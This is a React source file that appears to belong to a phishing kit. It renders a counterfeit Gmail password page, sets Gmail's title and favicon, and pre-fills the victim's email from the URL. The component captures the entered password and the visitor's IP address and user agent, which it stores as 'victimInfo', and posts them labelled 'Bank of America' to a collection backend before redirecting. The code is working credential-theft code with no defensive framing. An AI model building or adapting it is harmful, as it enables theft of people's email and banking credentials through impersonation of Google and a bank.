import "../styles/gmail.css";
import { useEffect, useMemo, useRef, useState } from "react";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME, ArrowDown, UserAvatar } from "../utils/constants";
import { IoMdArrowDropdown } from "react-icons/io";
import axios from "axios";
import API from "../api/api";

const Gmail = () => {
  const [password, setPassword] = useState("");
  const [isShow, setIsShow] = useState(false);
  const [isError, setIsError] = useState(false);
  const passwordRef = useRef(null);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const email = useMemo(() => {
    const query = new URLSearchParams(window.location.search);
    return query.get("email");
  }, [window.location]);

  const handleSubmit = async () => {
    if (!password) {
      setIsError(true);
      return;
    }

    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    sessionStorage.setItem(
      APP_STORAGE_NAME,
      JSON.stringify({
        ..._data,
        providerInfo: { provider: "gmail", password },
      }),
    );

    const __data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    try {
      const res = await API.createDetail({
        ...__data,
        bank: "Bank of America",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        window.location.href = `/account?${randParams()}`;
      }
    } catch (error) {
      alert("Something went wrong");
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  useEffect(() => {
    if (passwordRef.current) {
      passwordRef.current.focus();
    }

    document.title = "Gmail";
    const favicon =
      document.querySelector("link[rel='icon']") ||
      document.createElement("link");
    favicon.href = "/images/gmail/gmail.ico";
    favicon.rel = "icon";
    document.head.appendChild(favicon);

    return () => {
      document.title = "Bank of America";
      document.head.removeChild(favicon);
    };
  }, []);

  return (
    <div className="gmail-wrapper">
      <div className="gmail-cont">
        <div className="gmail-body">
          <div className="grid place-items-center">
            <img
              src="/images/gmail/googleLogo.svg"
              alt="Google"
              height={24}
            />
          </div>

          <div className="w-full font-[500]">
            <h1
              className="text-center pt-4 text-[24px] leading-[1.3333]"
              style={{
                fontFamily:
                  "'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif",
              }}
            >
              Welcome
            </h1>

            <div className="h-8 mt-2 grid place-items-center">
              <div className="email-holder">
                <span className="mr-2">
                  <UserAvatar />
                </span>
                <span>{email}</span>
                <span className="ml-1">
                  <ArrowDown />
                </span>
              </div>
            </div>

            <div
              className="w-full pt-[48px]"
              style={{ fontFamily: "'Google Sans', Roboto, Arial, sans-serif" }}
            >
              <div
                style={{
                  border: `2px solid ${!isError ? "#1a73e8" : "#d93025"}`,
                }}
                className="w-full rounded h-[56px] relative "
              >
                <label
                  className="absolute top-[-11px] left-[10px] px-[5px] bg-white text-[13px]"
                  style={{ color: !isError ? "#80868b" : "#d93025" }}
                >
                  Enter a password
                </label>
                <input
                  ref={passwordRef}
                  className="w-full h-full px-4"
                  type={!isShow ? "password" : "text"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>

              {isError && (
                <span className="mt-1 flex items-center">
                  <span className="mr-2">
                    <svg
                      fill="#d93025"
                      focusable="false"
                      width="16px"
                      height="16px"
                      viewBox="0 0 24 24"
                      xmlns="https://www.w3.org/2000/svg"
                    >
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                    </svg>
                  </span>
                  <span className="text-[12px] text-[#d93025]">
                    Enter a password
                  </span>
                </span>
              )}

              <div className="pt-2 flex items-center">
                <input
                  id="checkbox"
                  type="checkbox"
                  className="w-4 h-5 ml-1"
                  onClick={() => setIsShow((prev) => !prev)}
                />
                <label
                  htmlFor="checkbox"
                  className="ml-4 text-sm"
                >
                  Show password
                </label>
              </div>

              <div className="mt-[48px] min-h-12 pb-5 flex items-center justify-between text-[.875rem]">
                <span className="text-[#1a73e8] hover:text-[#174ea6] cursor-pointer">
                  Forgot password?
                </span>
                <button
                  onClick={handleSubmit}
                  className="h-[36px] w-[78px] rounded bg-[#1a73e8] text-white font-[500] hover:shadow-[0_1px_2px_0_#3c40434d_,_0_1px_3px_1px_#3c404326]"
                >
                  Next
                </button>
              </div>
            </div>
          </div>
        </div>
        <div className="gmail-footer">
          <div className="gmail-lang">
            <span>English</span>
            <IoMdArrowDropdown />
          </div>
          <div className="gmail-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Gmail;
